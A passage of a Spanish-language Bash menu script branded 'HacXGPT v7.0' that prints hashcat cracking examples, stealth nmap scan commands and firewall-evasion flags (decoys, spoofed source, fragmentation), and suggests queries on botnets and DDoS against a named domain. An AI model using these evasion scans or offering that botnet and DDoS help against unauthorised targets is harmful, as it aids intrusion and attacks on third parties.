            echo ""
            echo "🎯 EJEMPLOS:"
            echo "- MD5: hashcat -m 0 hash.txt rockyou.txt"
            echo "- SHA256: hashcat -m 1400 hash.txt -a 3 ?d?d?d?d"
            echo "- NTLM: hashcat -m 1000 ntlm_hash.txt wordlist.txt"
            echo ""
            echo "⚖️ LEGALIDAD:"
            echo "- Solo hashes propios o con autorización"
            echo "- Auditorías de seguridad autorizadas"
        
        # RESPUESTA POR DEFECTO
        else
            echo "ℹ️ No reconozco esa pregunta específica."
            echo ""
            echo "🎯 Prueba con:"
            echo "- 'botnet sobre ztlab.com.ar'"
            echo "- 'como hacer ddos'"
            echo "- 'sql injection técnicas'"
            echo "- 'nmap comandos'"
            echo "- 'xss payloads'"
            echo "- 'hash cracking'"
        fi
        
        echo "══════════════════════════════════════════════"
        echo ""
        read -p "💬 Otra pregunta? (Enter para salir): " continuar
        if [[ -z "$continuar" ]]; then
            return
        fi
    done
}

# ============================================
# 8. ESCANEO SIGILOSO (IMPLEMENTADO)
# ============================================
escaneo_sigiloso() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}🔍 ESCANEO SIGILOSO${CYAN}                ║${NC}"
        echo -e "${CYAN}║      ${YELLOW}Técnicas avanzadas de escaneo${CYAN}        ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🎯 TÉCNICAS DE ESCANEO SIGILOSO:${NC}"
        echo ""
        echo "1. Escaneo TCP SYN (Stealth)"
        echo "2. Escaneo XMAS Tree"
        echo "3. Escaneo FIN"
        echo "4. Escaneo NULL"
        echo "5. Escaneo UDP"
        echo "6. Técnicas de evasión"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🎯 Objetivo para SYN Stealth: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 ESCANEO TCP SYN STEALTH:${NC}"
                    echo ""
                    echo "• Comando básico: nmap -sS $objetivo"
                    echo "• Con timing lento: nmap -sS -T2 $objetivo"
                    echo "• Puertos específicos: nmap -sS -p 80,443,22 $objetivo"
                    echo "• Sin ping: nmap -sS -Pn $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes SYN y analiza respuestas SYN-ACK"
                    echo "No completa el handshake TCP (más sigiloso)"
                fi
                ;;
            2)
                read -p "🎯 Objetivo para XMAS Tree: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🎄 ESCANEO XMAS TREE:${NC}"
                    echo ""
                    echo "• Comando: nmap -sX $objetivo"
                    echo "• Con opciones: nmap -sX -T2 $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes con flags FIN, URG y PUSH activados"
                    echo "Como un árbol de Navidad (XMAS)"
                fi
                ;;
            3)
                read -p "🎯 Objetivo para FIN Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🏁 ESCANEO FIN:${NC}"
                    echo ""
                    echo "• Comando: nmap -sF $objetivo"
                    echo "• Variante: nmap -sF -f $objetivo (fragmentado)"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes solo con flag FIN activado"
                    echo "Útil para evadir firewalls simples"
                fi
                ;;
            4)
                read -p "🎯 Objetivo para NULL Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🚫 ESCANEO NULL:${NC}"
                    echo ""
                    echo "• Comando: nmap -sN $objetivo"
                    echo ""
                    echo "📊 EXPLICACIÓN:"
                    echo "Envía paquetes sin ningún flag activado"
                    echo "Completamente 'null'"
                fi
                ;;
            5)
                read -p "🎯 Objetivo para UDP Scan: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}📨 ESCANEO UDP:${NC}"
                    echo ""
                    echo "• Comando: nmap -sU $objetivo"
                    echo "• Puertos comunes: nmap -sU -F $objetivo"
                    echo "• Todos los puertos: nmap -sU -p- $objetivo (MUY LENTO)"
                    echo ""
                    echo "⚠️ ADVERTENCIA:"
                    echo "Los escaneos UDP son muy lentos"
                    echo "Puede tomar horas para todos los puertos"
                fi
                ;;
            6)
                echo ""
                echo -e "${YELLOW}🎭 TÉCNICAS DE EVASIÓN:${NC}"
                echo ""
                echo "• Fragmentación: nmap -f"
                echo "• MTU personalizado: nmap --mtu 16"
                echo "• Decoys: nmap -D RND:10"
                echo "• Spoofing: nmap -S [IP_FALSA]"
                echo "• Source port: nmap --source-port 53"
                echo "• Timing aleatorio: nmap --scan-delay 5s"
                echo "• Data length: nmap --data-length 50"
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    show_banner
    
    echo -e "${GREEN}🛡️ 1. ${NC} Reconocimiento Básico"
    echo -e "${GREEN}🌐 2. ${NC} Escaneo Web"
    echo -e "${GREEN}📡 3. ${NC} Análisis de Red"
    echo -e "${GREEN}⚔️ 4. ${NC} Suite de Pentesting"
    echo -e "${GREEN}📊 5. ${NC} Generar Reportes"
    echo -e "${GREEN}🔧 6. ${NC} Herramientas Avanzadas"
    echo -e "${CYAN}💬 7. ${NC} Chat Libre Técnico ${GREEN}(FUNCIONAL)${NC}"
    echo -e "${CYAN}🔍 8. ${NC} Escaneo Sigiloso ${GREEN}(FUNCIONAL)${NC}"
    echo -e "${RED}❌ 0. ${NC} Salir"
    echo ""
    
    read -p "🎯 Selecciona opción [0-8]: " main_opcion
    
    case $main_opcion in
        1)
            reconocimiento_basico
            ;;
        2)
            escaneo_web
            ;;
        3)
            analisis_red
            ;;
        4)
            suite_pentesting
            ;;
        5)
            generar_reportes
            ;;
        6)
            herramientas_avanzadas
            ;;
        7)
            chat_libre
            ;;
        8)
            escaneo_sigiloso
            ;;
        0)
            show_banner
            echo ""
            echo -e "${GREEN}            ¡HASTA PRONTO! ${NC}"
            echo -e "${BLUE}      Gracias por usar HacXGPT v7.0 ${NC}"
            echo ""
            echo ""
            exit 0
            ;;
        *)
            echo ""
            echo -e "${RED}❌ Opción no válida${NC}"
            sleep 1
            ;;
    esac
done
